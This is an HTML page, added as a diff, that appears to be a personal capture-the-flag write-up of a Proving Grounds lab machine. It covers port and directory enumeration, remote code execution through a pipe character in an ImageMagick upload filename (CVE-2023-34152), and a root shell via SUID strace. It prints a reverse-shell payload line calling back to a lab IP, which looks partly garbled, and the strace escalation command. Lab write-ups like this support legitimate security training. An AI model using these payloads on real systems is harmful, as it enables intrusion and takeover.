@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Image Writeup - Rachel Murphy" />
+  <title>PG: Image | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Image — Writeup</h1>
+      <p class="meta">Proving Grounds — Linux / Web Exploitation / ImageMagick Vulnerability</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine Summary -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Intermediate</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds (Practice)</p>
+      <p><strong>Description:</strong> Image is a Linux VM hosting a vulnerable web server running an outdated version of ImageMagick (Identifier 6.9-6-4). The goal is to exploit the ImageMagick vulnerability to gain an initial shell and then escalate privileges via an SUID misconfiguration (strace binary) to root.</p>
+    </section>
+
+    <!-- Enumeration -->
+    <section class="enumeration">
+      <h2>Enumeration</h2>
+      <p>Initial full port scan:</p>
+      <pre><code>sudo nmap -sC -sV -p- 192.168.236.178 -oN nmap-image</code></pre>
+
+      <p>Port 80 - web server:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711142152.png" alt="Port 80 web server">
+      <p>Suspected ImageMagick-based upload (magic bytes detection):</p>
+      <img class="screenshot" src="../images/Pasted image 20250711142426.png" alt="ImageMagick upload page">
+
+      <h3>Directory discovery with Ferox</h3>
+      <pre><code>feroxbuster -u http://192.168.236.178/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711144116.png" alt="Feroxbuster results">
+    </section>
+
+    <!-- Web Exploitation -->
+    <section class="web-exploitation">
+      <h2>Web Exploitation</h2>
+
+      <p>Uploading a web shell via ImageMagick Identifier exploit:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711142454.png" alt="Upload web shell">
+      <img class="screenshot" src="../images/Pasted image 20250711142518.png" alt="Webshell uploaded">
+      <p>Current version detected: 6.9-6-4</p>
+      <img class="screenshot" src="../images/Pasted image 20250711142621.png" alt="ImageMagick version 6.9-6-4">
+
+      <p>Googled ImageMagick Identifier exploit: <a href="https://github.com/ImageMagick/ImageMagick/issues/6339">https://github.com/ImageMagick/ImageMagick/issues/6339</a></p>
+
+      <p>Using pipe character in filename to trigger RCE. Example payload (base64-encoded bash reverse shell):</p>
+      <pre><code>YmFzaCAgLWkgPiYgL2Rldi90Y3Av192.168.45.152/9001 0>&1</code></pre>
+
+      <p>Attempting exploit with Python PoC:</p>
+      <p><a href="https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152/blob/main/CVE-2023-34152.py">ImageMagick CVE-2023-34152 PoC</a></p>
+      <img class="screenshot" src="../images/Pasted image 20250711150452.png" alt="ImageTragick exploit working">
+      <img class="screenshot" src="../images/Pasted image 20250711150826.png" alt="Reverse shell successful">
+    </section>
+
+    <!-- User Shell -->
+    <section class="user-shell">
+      <h2>User Shell Access</h2>
+      <p>Initial reverse shell obtained via ImageMagick RCE. User is www-data.</p>
+      <img class="screenshot" src="../images/Pasted image 20250711150846.png" alt="www-data shell">
+    </section>
+
+    <!-- Privilege Escalation -->
+    <section class="privilege-escalation">
+      <h2>Privilege Escalation</h2>
+      <p>Enumeration shows an SUID binary available:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711151232.png" alt="SUID binary detected">
+      <img class="screenshot" src="../images/Pasted image 20250711151253.png" alt="Further enumeration SUID">
+      <p>File generation exploit worked to trigger root shell:</p>
+      <img class="screenshot" src="../images/Pasted image 20250711152400.png" alt="Exploit file generation">
+      <img class="screenshot" src="../images/Pasted image 20250711152508.png" alt="Root shell">
+
+      <p>Privilege escalation via SUID strace:</p>
+      <pre><code>/usr/bin/strace -o /dev/null /bin/sh -p</code></pre>
+      <img class="screenshot" src="../images/Pasted image 20250711152701.png" alt="Root shell from strace SUID">
+    </section>
+
+    <!-- Summary -->
+    <section class="summary">
+      <h2>Box Summary</h2>
+      <ul>
+        <li>Enumeration of web server and upload functionality.</li>
+        <li>Exploited ImageMagick vulnerability (CVE-2023-34152) for initial shell.</li>
+        <li>Used SUID misconfiguration (strace binary) to escalate to root.</li>
+        <li>Developed understanding of image-based RCE exploitation.</li>
+        <li>Practiced safe, controlled exploitation workflow from reconnaissance to root.</li>
+      </ul>
+    </section>
+
+  </main>
+</body>
+</html>
